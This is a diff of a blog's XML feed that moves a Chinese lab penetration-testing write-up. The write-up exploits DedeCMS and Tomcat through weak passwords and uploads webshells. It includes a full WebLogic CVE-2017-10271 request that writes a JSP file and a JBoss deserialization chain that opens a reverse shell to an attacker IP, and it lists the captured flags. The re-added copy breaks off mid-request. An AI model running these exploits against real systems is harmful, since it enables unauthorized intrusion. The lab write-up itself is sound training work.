-    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">提示：一共12个flag，有内网。</span><br><span class="line">标准：5个合格</span><br><span class="line">靶场地址：http:&#x2F;&#x2F;1.14.65.168:8077&#x2F;m&#x2F;index.php</span><br><span class="line">刚过完年，来玩一玩</span><br></pre></td></tr></table></figure>
-
-<p>[TOC]</p>
-<span id="more"></span>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得flag:</span><br><span class="line">1.14.65.168    </span><br><span class="line">        flag&#123;dc53e209ffa7f1cd8c7ebdc2eeff34a7&#125;    </span><br><span class="line">flag1 : flag&#123;f784234649d7ef161229349d1d76ba8d&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.38tomcat</span><br><span class="line">flag3 ：flag&#123;03bbcaf39bdd08fa8d0d9e5477e102c5&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.66</span><br><span class="line">flag5  :flag&#123;b717ca3e4543f05e6970ede833d68ba4&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.76</span><br><span class="line">flag4  :flag&#123;22fceae28669c34d139f7ff6db690acb&#125; </span><br><span class="line"></span><br><span class="line">172.16.20.135</span><br><span class="line">flag9  :flag&#123;27e6221a8a55c8ee7396e74531dc7d9d&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Powered by <a href="http://www.dedecms.com/"><strong>DedeCMSV57_UTF8_SP1</strong></a> </p>
-<p><a href="http://1.14.65.168:8077/data/admin/ver.txt">http://1.14.65.168:8077/data/admin/ver.txt</a>       版本时间20170303</p>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="http://1.14.65.168:8077/dede/">http://1.14.65.168:8077/dede/</a>             admin/admin 后台弱口令</p>
-<p>后台任意文件上传</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102150406908.png" alt="image-20220102150406908"></p>
-<p>哥斯拉连接，看了要提权</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151302899.png" alt="image-20220102151302899"></p>
-<p>html目录下     第一个flag{dc53e209ffa7f1cd8c7ebdc2eeff34a7}  ，或者robots.txt 直接给的有路径</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151350497.png" alt="image-20220102151350497"></p>
-<p>根目录下   第二个flag{f784234649d7ef161229349d1d76ba8d}</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151427997.png" alt="image-20220102151427997"></p>
-<p>本机为172.16.20.66</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102152600971.png" alt="image-20220102152600971"></p>
-<h2 id="内网其他主机扫描"><a href="#内网其他主机扫描" class="headerlink" title="内网其他主机扫描"></a>内网其他主机扫描</h2><p>发现某位师傅的fscan（<a href="https://github.com/shadow1ng/fscan">shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a>），正好对内网172.16.20.* 网段存活主机扫描</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102155438573.png" alt="image-20220102155438573"></p>
-<p>发现其他5台存活主机</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(icmp) Target &#39;172.16.20.38&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.62&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.66&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.76&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.135&#39; is alive</span><br><span class="line">icmp alive hosts len is: 5</span><br><span class="line">172.16.20.38:8009 open</span><br><span class="line">172.16.20.135:8009 open</span><br><span class="line">172.16.20.66:1080 open</span><br><span class="line">172.16.20.135:8080 open</span><br><span class="line">172.16.20.76:8080 open</span><br><span class="line">172.16.20.38:8080 open</span><br><span class="line">172.16.20.62:7001 open</span><br><span class="line">172.16.20.66:80 open</span><br><span class="line">172.16.20.135:8093 open</span><br><span class="line">172.16.20.135:8083 open</span><br><span class="line">alive ports len is: 10</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.62:7001  code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.62:7001  [weblogic] </span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080  code:302 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8083 code:400 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 code:200 len:10     title:Login Page</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.38:8080  code:200 len:20     title:Apache Tomcat&#x2F;8.0.43</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8080 code:200 len:1507   title:Welcome to JBoss&amp;trade;</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.66       code:200 len:12     title:我的网站</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 [Shiro] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.135:8080 [Jboss JBOSS] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080&#x2F;manager&#x2F;html tomcat tomcat</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080 poc-yaml-tomcat-manager-week</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h2 id="挂代理"><a href="#挂代理" class="headerlink" title="挂代理"></a>挂代理</h2><p>frp 代理出现两个问题，</p>
-<p>1，我的frpc竟然不能运行，重新下载了</p>
-<p>2，这个报错是frpc.ini里面的注释没有删除</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164513360.png" alt="image-20220102164513360"></p>
-<p>终于代理好了，</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164839124.png" alt="image-20220102164839124"></p>
-<p>下面就一个一个网站看吧</p>
-<h3 id="172-16-20-38-tomcat"><a href="#172-16-20-38-tomcat" class="headerlink" title="172.16.20.38 tomcat"></a>172.16.20.38 tomcat</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165200772.png" alt="image-20220102165200772"></p>
-<p><a href="http://172.16.20.38:8080/manager/html">http://172.16.20.38:8080/manager/html</a> </p>
-<p>tomcat tomcat登陆，进入后台</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165822763.png" alt="image-20220102165822763"></p>
-<p>Tomcat 后台部署war木马getshell       哥斯拉生成shel.jsp，jar -cvf sh.war shel.jsp</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102172206117.png" alt="image-20220102172206117"></p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173735362.png" alt="image-20220102173735362"></p>
-<p><a href="http://172.16.20.38:8080/sh/shel.jsp">http://172.16.20.38:8080/sh/shel.jsp</a>  </p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173917456.png" alt="image-20220102173917456"></p>
-<p>拿到flag3 ：flag{03bbcaf39bdd08fa8d0d9e5477e102c5}</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174042500.png" alt="image-20220102174042500"></p>
-<p>root权限，双网卡发现inet 10.2.5.20/20 brd 10.2.15.255 scope global eth1  另一个网段10.2.5.*</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174312642.png" alt="image-20220102174312642"></p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174301803.png" alt="image-20220102174301803"></p>
-<h3 id="172-16-20-62-weblogic"><a href="#172-16-20-62-weblogic" class="headerlink" title="172.16.20.62 weblogic"></a>172.16.20.62 weblogic</h3><p><a href="http://172.16.20.62:7001/">http://172.16.20.62:7001</a>  fscan扫出来的是weblogic</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br></pre></td></tr></table></figure>
-
-
-
-<p>能访问<a href="http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11%E8%AF%B4%E6%98%8E%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8cve-2017-10271%E6%BC%8F%E6%B4%9E">http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11说明可能存在cve-2017-10271漏洞</a></p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102181059955.png" alt="image-20220102181059955"></p>
-<p>我说咋不能利用exp，原来，burp没有挂代理。。。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.16</span><span class="number">.20</span><span class="number">.62</span>:<span class="number">7001</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">95.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">95.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Type: text/xml</span></span><br><span class="line"><span class="comment">Content-Length: 3282</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="comment">         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="comment">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; </span></span><br><span class="line"><span class="comment">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/1.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span></span><br><span class="line"><span class="comment">                        &lt;string&gt;</span></span><br><span class="line"><span class="comment">&lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span></span><br><span class="line"><span class="comment">                    &lt;/object&gt;</span></span><br><span class="line"><span class="comment">            &lt;/java&gt;</span></span><br><span class="line"><span class="comment">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="comment">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;% out.print(&quot;test&quot;); %&gt; 换成对应jsp🐎</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003302676.png" alt="image-20220103003302676"></p>
-<p><a href="http://172.16.20.62:7001/wls-wsat/1.jsp">http://172.16.20.62:7001/wls-wsat/1.jsp</a></p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003242901.png" alt="image-20220103003242901"></p>
-<p>哥斯拉链接</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002839036.png" alt="image-20220103002839036"></p>
-<p>root用户，无其他网段</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002921369.png" alt="image-20220103002921369"></p>
-<p>flag5  :flag{b717ca3e4543f05e6970ede833d68ba4}</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003009202.png" alt="image-20220103003009202"></p>
-<h3 id="172-16-20-76-Shiro"><a href="#172-16-20-76-Shiro" class="headerlink" title="172.16.20.76 Shiro"></a>172.16.20.76 Shiro</h3><p>[*] WebTitle:<a href="http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33">http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33</a> code:200 len:10     title:Login Page</p>
-<p>确定为Shiro</p>
-<p>用工具<a href="https://github.com/j1anFen/shiro_attack/releases">https://github.com/j1anFen/shiro_attack/releases</a></p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021106383-16411470674991.png" alt="image-20220103021106383"></p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021136691.png" alt="image-20220103021136691"></p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021026217.png" alt="image-20220103021026217"></p>
-<h3 id="172-16-20-135-JBoss"><a href="#172-16-20-135-JBoss" class="headerlink" title="172.16.20.135 JBoss"></a>172.16.20.135 JBoss</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102231302358.png" alt="image-20220102231302358"></p>
-<ul>
-<li><p><a href="http://172.16.20.135:8080/web-console/">JBoss Web Console</a></p>
-<p>  admin  admin 进入</p>
-</li>
-</ul>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102230723865.png" alt="image-20220102230723865"></p>
-<p>确定版本可以使用CVE-2017-7504  [JBoss 4.x JBossMQ JMS 反序列化漏洞]([（CVE 2017 7504）JBoss 4.x JBossMQ JMS 反序列化漏洞 - Wiki (96.mk)](<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jboss/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-7504%EF%BC%89JBoss">https://wiki.96.mk/Web安全/Jboss/反序列化漏洞/（CVE-2017-7504）JBoss</a> 4.x JBossMQ JMS 反序列化漏洞/))</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;ianxtianxt&#x2F;CVE-2015-7501.git</span><br><span class="line"></span><br><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口)</span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br><span class="line">curl http:&#x2F;&#x2F;172.16.20.135:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102233858765.png" alt="image-20220102233858765"></p>
-<p>root权限</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234228765.png" alt="image-20220102234228765"></p>
-<p>inet 10.2.5.62/20 brd 10.2.15.255 scope global eth1    发现10.2.5.*网段</p>
-<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234258565.png" alt="image-20220102234258565"></p>
-<hr>
-<p>干不动了，二层三层内网后续更新，哎实际上就是代理+漏洞复现。</p>
-<p>感悟：第一是工具，第二是漏洞不是很敏感</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>漏洞利用</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>One step a day</title>
     <url>/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/</url>
     <content><![CDATA[<h2 id="2020-11-4-SSTI模板注入"><a href="#2020-11-4-SSTI模板注入" class="headerlink" title="2020.11.4-SSTI模板注入"></a>2020.11.4-SSTI模板注入</h2><blockquote>
@@ -2422,6 +2337,118 @@
       </categories>
       <tags>
         <tag>buu刷题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>简单的靶场渗透</title>
+    <url>/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">提示：一共12个flag，有内网。</span><br><span class="line">标准：5个合格</span><br><span class="line">靶场地址：http:&#x2F;&#x2F;1.14.65.168:8077&#x2F;m&#x2F;index.php</span><br><span class="line">刚过完年，来玩一玩</span><br></pre></td></tr></table></figure>
+
+<p>[TOC]</p>
+<span id="more"></span>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得flag:</span><br><span class="line">1.14.65.168    </span><br><span class="line">        flag&#123;dc53e209ffa7f1cd8c7ebdc2eeff34a7&#125;    </span><br><span class="line">flag1 : flag&#123;f784234649d7ef161229349d1d76ba8d&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.38tomcat</span><br><span class="line">flag3 ：flag&#123;03bbcaf39bdd08fa8d0d9e5477e102c5&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.66</span><br><span class="line">flag5  :flag&#123;b717ca3e4543f05e6970ede833d68ba4&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.76</span><br><span class="line">flag4  :flag&#123;22fceae28669c34d139f7ff6db690acb&#125; </span><br><span class="line"></span><br><span class="line">172.16.20.135</span><br><span class="line">flag9  :flag&#123;27e6221a8a55c8ee7396e74531dc7d9d&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Powered by <a href="http://www.dedecms.com/"><strong>DedeCMSV57_UTF8_SP1</strong></a> </p>
+<p><a href="http://1.14.65.168:8077/data/admin/ver.txt">http://1.14.65.168:8077/data/admin/ver.txt</a>       版本时间20170303</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="http://1.14.65.168:8077/dede/">http://1.14.65.168:8077/dede/</a>             admin/admin 后台弱口令</p>
+<p>后台任意文件上传</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102150406908.png" alt="image-20220102150406908"></p>
+<p>哥斯拉连接，看了要提权</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151302899.png" alt="image-20220102151302899"></p>
+<p>html目录下     第一个flag{dc53e209ffa7f1cd8c7ebdc2eeff34a7}  ，或者robots.txt 直接给的有路径</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151350497.png" alt="image-20220102151350497"></p>
+<p>根目录下   第二个flag{f784234649d7ef161229349d1d76ba8d}</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151427997.png" alt="image-20220102151427997"></p>
+<p>本机为172.16.20.66</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102152600971.png" alt="image-20220102152600971"></p>
+<h2 id="内网其他主机扫描"><a href="#内网其他主机扫描" class="headerlink" title="内网其他主机扫描"></a>内网其他主机扫描</h2><p>发现某位师傅的fscan（<a href="https://github.com/shadow1ng/fscan">shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a>），正好对内网172.16.20.* 网段存活主机扫描</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102155438573.png" alt="image-20220102155438573"></p>
+<p>发现其他5台存活主机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(icmp) Target &#39;172.16.20.38&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.62&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.66&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.76&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.135&#39; is alive</span><br><span class="line">icmp alive hosts len is: 5</span><br><span class="line">172.16.20.38:8009 open</span><br><span class="line">172.16.20.135:8009 open</span><br><span class="line">172.16.20.66:1080 open</span><br><span class="line">172.16.20.135:8080 open</span><br><span class="line">172.16.20.76:8080 open</span><br><span class="line">172.16.20.38:8080 open</span><br><span class="line">172.16.20.62:7001 open</span><br><span class="line">172.16.20.66:80 open</span><br><span class="line">172.16.20.135:8093 open</span><br><span class="line">172.16.20.135:8083 open</span><br><span class="line">alive ports len is: 10</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.62:7001  code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.62:7001  [weblogic] </span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080  code:302 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8083 code:400 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 code:200 len:10     title:Login Page</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.38:8080  code:200 len:20     title:Apache Tomcat&#x2F;8.0.43</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8080 code:200 len:1507   title:Welcome to JBoss&amp;trade;</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.66       code:200 len:12     title:我的网站</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 [Shiro] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.135:8080 [Jboss JBOSS] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080&#x2F;manager&#x2F;html tomcat tomcat</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080 poc-yaml-tomcat-manager-week</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="挂代理"><a href="#挂代理" class="headerlink" title="挂代理"></a>挂代理</h2><p>frp 代理出现两个问题，</p>
+<p>1，我的frpc竟然不能运行，重新下载了</p>
+<p>2，这个报错是frpc.ini里面的注释没有删除</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164513360.png" alt="image-20220102164513360"></p>
+<p>终于代理好了，</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164839124.png" alt="image-20220102164839124"></p>
+<p>下面就一个一个网站看吧</p>
+<h3 id="172-16-20-38-tomcat"><a href="#172-16-20-38-tomcat" class="headerlink" title="172.16.20.38 tomcat"></a>172.16.20.38 tomcat</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165200772.png" alt="image-20220102165200772"></p>
+<p><a href="http://172.16.20.38:8080/manager/html">http://172.16.20.38:8080/manager/html</a> </p>
+<p>tomcat tomcat登陆，进入后台</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165822763.png" alt="image-20220102165822763"></p>
+<p>Tomcat 后台部署war木马getshell       哥斯拉生成shel.jsp，jar -cvf sh.war shel.jsp</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102172206117.png" alt="image-20220102172206117"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173735362.png" alt="image-20220102173735362"></p>
+<p><a href="http://172.16.20.38:8080/sh/shel.jsp">http://172.16.20.38:8080/sh/shel.jsp</a>  </p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173917456.png" alt="image-20220102173917456"></p>
+<p>拿到flag3 ：flag{03bbcaf39bdd08fa8d0d9e5477e102c5}</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174042500.png" alt="image-20220102174042500"></p>
+<p>root权限，双网卡发现inet 10.2.5.20/20 brd 10.2.15.255 scope global eth1  另一个网段10.2.5.*</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174312642.png" alt="image-20220102174312642"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174301803.png" alt="image-20220102174301803"></p>
+<h3 id="172-16-20-62-weblogic"><a href="#172-16-20-62-weblogic" class="headerlink" title="172.16.20.62 weblogic"></a>172.16.20.62 weblogic</h3><p><a href="http://172.16.20.62:7001/">http://172.16.20.62:7001</a>  fscan扫出来的是weblogic</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br></pre></td></tr></table></figure>
+
+
+
+<p>能访问<a href="http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11%E8%AF%B4%E6%98%8E%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8cve-2017-10271%E6%BC%8F%E6%B4%9E">http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11说明可能存在cve-2017-10271漏洞</a></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102181059955.png" alt="image-20220102181059955"></p>
+<p>我说咋不能利用exp，原来，burp没有挂代理。。。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.16</span><span class="number">.20</span><span class="number">.62</span>:<span class="number">7001</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">95.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">95.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Type: text/xml</span></span><br><span class="line"><span class="comment">Content-Length: 3282</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="comment">         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="comment">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; </span></span><br><span class="line"><span class="comment">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/1.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span></span><br><span class="line"><span class="comment">                        &lt;string&gt;</span></span><br><span class="line"><span class="comment">&lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void 